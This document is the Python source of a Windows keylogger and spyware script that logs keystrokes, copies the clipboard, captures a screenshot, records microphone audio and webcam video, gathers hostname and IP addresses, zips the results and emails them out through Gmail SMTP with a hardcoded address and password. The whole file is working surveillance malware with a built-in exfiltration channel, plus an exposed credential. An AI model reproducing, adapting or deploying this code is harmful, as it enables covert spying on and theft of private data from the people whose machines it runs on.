from pynput.keyboard import Listener, Key

#Email Library
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

#Everything Else
import win32clipboard
import socket
import platform
import time
import os
import cv2
from zipfile import ZipFile
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# file paths
file_path = r"Z:\keylogger\email"
log_file = r"\keylog.txt"
system_file = r"\systeminfo.txt"
clipboard_file = r"\clipboard.txt"
audio_file = r"\audio.wav"
screenshot_file = r"\screenshot.png"
video_file = r"\recording.avi"

# email credentials
email_address = "keyloggerproject4@gmail.com"
password = "Keylogger12345!"
to_address = "keyloggerproject4@gmail.com"

# finds path to keylogger
path = os.path.dirname("keylogger.py")
email_folder = path + r"\keylogger\email"
email_folder_zip = path + r"\keylogger\email.zip"


def send_email(file_path, attachment, to_address):

    from_address = email_address

    msg = MIMEMultipart()

    msg['From'] = from_address

    msg['To'] = to_address

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = file_path
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'zip')

    p.set_payload(attachment.read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(from_address, password)

    text = msg.as_string()

    s.sendmail(from_address, to_address, text)

    s.quit()


def computer_information():
    with open(file_path + system_file, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: \n" + public_ip)

        except Exception:
            f.write("Could not get Public IP Address.")

        f.write("Processor" + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + "  " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname:" + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


def copy_clipboard():
    with open(file_path + clipboard_file, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("\n \n Clipboard Data: \n" + pasted_data)

        except:
            f.write("Error copying clipboard.")


def microphone():
    fs = 44100
    microphone_time = 10
    seconds = microphone_time

    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + audio_file, fs, recording)


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + screenshot_file)


# extra methods to capture webcam recording in progress
STD_DIMENSIONS = {
    "480p": (640, 480),
    "720p": (1280, 720),
    "1080p": (1920, 1080),
    "4k": (3840, 2160),
}
VIDEO_TYPE = {
    'avi': cv2.VideoWriter_fourcc(*'XVID'),
    'mp4': cv2.VideoWriter_fourcc(*'XVID'),
}


def change_res(cap, width, height):
    cap.set(3, width)
    cap.set(4, height)


def get_dims(cap, res='1080p'):
    width, height = STD_DIMENSIONS["480p"]
    if res in STD_DIMENSIONS:
        width, height = STD_DIMENSIONS[res]
    change_res(cap, width, height)
    return width, height


def get_video_type(filename):
    filename, ext = os.path.splitext(filename)
    if ext in VIDEO_TYPE:
        return VIDEO_TYPE[ext]
    return VIDEO_TYPE['avi']


def webcam():
    res = '720p'
    capture_duration = 10
    start_time = time.time()
    cap = cv2.VideoCapture(0)
    out = cv2.VideoWriter(email_folder + video_file, get_video_type(email_folder + video_file), 25, get_dims(cap, res))

    if not cap.isOpened():
        raise IOError("Cannot open webcam")

    while int(time.time() - start_time) < capture_duration:
        ret, frame = cap.read()
        out.write(frame)

    cap.release()
    out.release()
    cv2.destroyAllWindows()


def zip_folder(filename, filename2, filename3, filename4, filename5, filename6):
    try:
        zipfile = ZipFile('email.zip', 'w')
        zipfile.write(filename)
        zipfile.write(filename2)
        zipfile.write(filename3)
        zipfile.write(filename4)
        zipfile.write(filename5)
        zipfile.write(filename6)
        print('zip file created successfully')
    except:
        print("zip file not created")


webcam()
screenshot()
microphone()
copy_clipboard()
computer_information()
zip_folder(email_folder + log_file, email_folder + system_file, email_folder + clipboard_file, email_folder + audio_file, email_folder + screenshot_file, email_folder + video_file)
send_email(log_file, email_folder_zip, to_address)
print("log was successfully archived")

# logger methods
count = 0
keys = []


def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count - 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + log_file, "a") as f:
        for key in keys:
            k = str(key).replace(",", " ")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
